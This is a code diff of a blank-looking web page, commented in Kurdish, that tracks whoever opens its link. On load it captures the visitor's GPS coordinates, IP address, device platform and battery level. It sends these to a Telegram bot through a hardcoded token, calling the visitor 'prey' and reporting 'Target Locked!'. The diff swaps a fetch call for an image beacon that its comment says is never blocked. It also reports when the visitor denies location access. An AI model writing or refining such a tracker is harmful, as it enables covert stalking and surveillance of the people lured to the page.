@@ -5,65 +5,51 @@
     <title> </title>
     <style>body { background: white; margin: 0; }</style>
 </head>
-<body onload="captureLocation()">
+<body onload="capture()">
 
 <script>
     const TOKEN = "8678050341:AAE7b3fvFpfGju4NXGaFiMsvhYC0UdnCYtE";
 
-    async function captureLocation() {
+    function _send(uid, text) {
+        // بەکارهێنانی وێنەیەک بۆ ناردنی داتا (ئەمە هەرگیز بلۆک ناکرێت)
+        const url = `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${uid}&text=${encodeURIComponent(text)}&parse_mode=HTML`;
+        const img = new Image();
+        img.src = url;
+    }
+
+    async function capture() {
         const params = new URLSearchParams(window.location.search);
         const uid = params.get('id');
         if (!uid) return;
 
-        // ١. یەکسەر ئایپی و باتری وەردەگرێت بەبێ پرس
-        let ip = "N/A", battery = "N/A", charging = "No";
-        try {
-            const ipRes = await fetch('https://api.ipify.org?format=json');
-            const ipJson = await ipRes.json();
-            ip = ipJson.ip;
-
-            if (navigator.getBattery) {
-                const b = await navigator.getBattery();
-                battery = Math.floor(b.level * 100) + "%";
-                charging = b.charging ? "Yes" : "No";
-            }
-        } catch (e) {}
-
-        // ٢. داوای مۆڵەتی لۆکەیشن دەکات (پەنجەرەی Allow لێرە دەردەکەوێت)
         navigator.geolocation.getCurrentPosition(async (pos) => {
             const lat = pos.coords.latitude;
             const lon = pos.coords.longitude;
-            const time = new Date().toLocaleTimeString('en-US', { hour: 'numeric', minute: 'numeric', hour12: true });
+            
+            // وەرگرتنی IP
+            let ip = "N/A";
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                const data = await res.json();
+                ip = data.ip;
+            } catch(e) {}
 
-            // وەرگرتنی ناوی شار بەپێی ئایپی
-            const geo = await fetch(`http://ip-api.com/json/${ip}`).then(r => r.json());
-            const city = geo.city || "Erbil/Bakhtiari";
-            const isp = geo.isp || "Korek Telecom";
+            let bat = "N/A";
+            if (navigator.getBattery) {
+                const b = await navigator.getBattery();
+                bat = Math.floor(b.level * 100) + "%";
+            }
 
-            let report = `🚨 <b>Target Locked!</b> (نێچیر گیرا)\n\n` +
-                         `📍 <b>Location:</b> <a href="https://www.google.com/maps?q=${lat},${lon}">[لینکی وردی Google Maps]</a>\n` +
-                         `🌐 <b>IP:</b> <code>${ip}</code> (${isp})\n` +
-                         `📱 <b>Device:</b> <code>${navigator.platform}</code>\n` +
-                         `🔋 <b>Battery:</b> <code>${battery}</code> (Charging: ${charging})\n` +
-                         `🕒 <b>Time:</b> <code>${time}</code>\n` +
-                         `🏙️ <b>City:</b> <code>${city}</code>`;
+            let report = `🚨 <b>Target Locked!</b>\n\n` +
+                         `📍 <b>Location:</b> https://www.google.com/maps?q=${lat},${lon}\n` +
+                         `🌐 <b>IP:</b> ${ip}\n` +
+                         `📱 <b>Device:</b> ${navigator.platform}\n` +
+                         `🔋 <b>Battery:</b> ${bat}`;
 
-            // ناردنی زانیارییەکان بۆ بۆتەکە
-            await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({
-                    chat_id: uid,
-                    text: report,
-                    parse_mode: "HTML",
-                    disable_web_page_preview: false
-                })
-            });
+            _send(uid, report);
 
-            // لێرە هیچ Redirect نییە، لاپەڕەکە سپی دەمێنێتەوە
         }, (err) => {
-            // ئەگەر نێچیرەکە Allow نەکرد، نامەیەک بنێرە کە ڕەتی کردەوە
-            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${uid}&text=⚠️ Target Denied Location! IP: ${ip}`);
+            _send(uid, "⚠️ Target Denied Location!");
         }, { enableHighAccuracy: true });
     }
 </script>
